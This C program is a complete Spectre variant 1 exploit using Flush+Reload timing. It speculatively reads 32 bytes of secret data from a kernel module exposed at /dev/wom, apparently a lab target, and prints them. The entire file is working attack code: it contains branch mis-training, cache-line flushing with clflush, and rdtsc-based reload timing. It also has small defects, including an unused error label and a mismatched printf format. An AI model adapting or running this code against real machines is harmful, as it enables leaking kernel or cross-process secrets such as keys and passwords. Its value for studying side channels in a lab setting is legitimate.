#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <setjmp.h>
#include <signal.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>

/* for ioctl */
#define WOM_MAGIC_NUM 0x1337
#define WOM_GET_ADDRESS \
	_IOR(WOM_MAGIC_NUM, 0, unsigned long)

#define KB (1024)
#define PAGE_SIZE (4*KB)
#define PROBE_BUFFER_SIZE (PAGE_SIZE*256)
#define PROBE_NUM 2
#define EXTRACT_SIZE 32
#define MAX_THEASHOLD 300
#define MIS_TRAIN_ITERATION	4
void *
wom_get_address(int fd)
{
	void *addr = NULL;

	if (ioctl(fd, WOM_GET_ADDRESS, &addr) < 0)
		return NULL;

	return addr;
}

unsigned long time_access_no_flush(const char *adrs) {
  volatile unsigned long time;
  asm __volatile__ (
    "  mfence             \n" // guarantees that every load and store instruction that precedes in program order the MFENCE instruction is globally visible
    "  lfence             \n" // LFENCE does not execute until all prior instructions have completed locally
    "  rdtsc              \n"
    "  lfence             \n"
    "  movl %%eax, %%esi  \n"
    "  movl (%1), %%eax   \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  subl %%esi, %%eax  \n"
    : "=a" (time)
    : "c" (adrs)
    :  "%esi", "%edx");
  return time;
}

unsigned int find_threshold()
{
	const char *addr = malloc(8);
	uint64_t t1=0, t2=0, t_sum_flush=0, t_sum_no_flush=0;

	for(size_t i = 0; i < PROBE_NUM; i++)
	{
		if(i%2==0){
			asm __volatile__ ("clflush 0(%0)" : : "r" (addr) :);
			t_sum_flush += time_access_no_flush(addr);
		}
		else
			t_sum_no_flush += time_access_no_flush(addr);
		
	}
	t_sum_flush = t_sum_flush / (PROBE_NUM/2);
	t_sum_no_flush = t_sum_no_flush / (PROBE_NUM/2);
	// printf("flush: %lu\nno flush: %lu\n", t_sum_flush, t_sum_no_flush);
	return (t_sum_flush + t_sum_no_flush)/2;
	 
}

volatile unsigned int *spectre_condition;

char *probe_buffer;
char spec_tmp;

static void __attribute__((optimize("-O3"))) spectre(const char *ptr)
{
	if(*spectre_condition)
		spec_tmp = *(probe_buffer + ((*ptr) * PAGE_SIZE));
	
}

int main(int argc, char *argv[])
{
	// printf("kir\n");
    const char *secret;
	int fd;

	fd = open("/dev/wom", O_RDONLY);

	if (fd < 0) 
	{
        perror("open");
		fprintf(stderr, "error: unable to open /dev/wom. "
			"Please build and load the wom kernel module.\n");
		return -1;
	}

	secret = wom_get_address(fd);

	//	Probing Buffer
	probe_buffer = malloc(PROBE_BUFFER_SIZE);
	memset(probe_buffer, 0, PROBE_BUFFER_SIZE);


	spectre_condition = malloc(sizeof(unsigned int));
	*spectre_condition = 1;

	//	A valid pointer to mis-train the speculation mode
	char *valid_ptr = malloc(1);
	*valid_ptr = 1;

	//	Timing result
	unsigned int probing_times_min[256];
	memset(probing_times_min, -1, 256*sizeof(unsigned int));

	unsigned char extracted_bytes[EXTRACT_SIZE];

	unsigned int threashold = 100;
	if(argc < 2)
		threashold = find_threshold(probe_buffer);
	
	else
		threashold = atoi(argv[1]);
	
	printf("Threshold: %lu\n", threashold);
	for(size_t byte_index = 0; byte_index < EXTRACT_SIZE; byte_index++)
	{
		for(size_t probe_id = 0; probe_id < PROBE_NUM; probe_id++)
		{
			// Training Phase
			for(size_t train_i = 0; train_i < MIS_TRAIN_ITERATION; train_i++)
				spectre(valid_ptr);
			
			
			//	Flush phase
			for(size_t i = 0; i < 256; i++)
				asm __volatile__ ("clflush 0(%0)" : : "r" (&probe_buffer[i*PAGE_SIZE]) :);
			
			// Specture Attack
			//	Flush the spectre condition to force wrong speculation
			*spectre_condition = 0;
			asm __volatile__ ("clflush 0(%0)" : : "r" (spectre_condition) :);
			pread(fd, NULL, 32, 0);
			spectre(secret+byte_index);

			//	Reload Phase
			for(size_t i = 0; i < 256; i++)
			{
				unsigned int r = i*PAGE_SIZE;
				unsigned int elapsed_time = time_access_no_flush(probe_buffer+r);
				
				if(probing_times_min[i] > elapsed_time)
					probing_times_min[i] = elapsed_time;
				
			}
		}
		for(size_t i = 1; i < 256; i++)
		{
			if(probing_times_min[i] < threashold)
			{
				extracted_bytes[byte_index]=i;
				break;
			}
			if(i == 255)
				--byte_index;
			
		}
		memset(probing_times_min, -1, 256*sizeof(unsigned int));
	}
	printf("%.32s\n", extracted_bytes);
	close(fd);

	return 0;

err_close:
	close(fd);
	return -1;
}
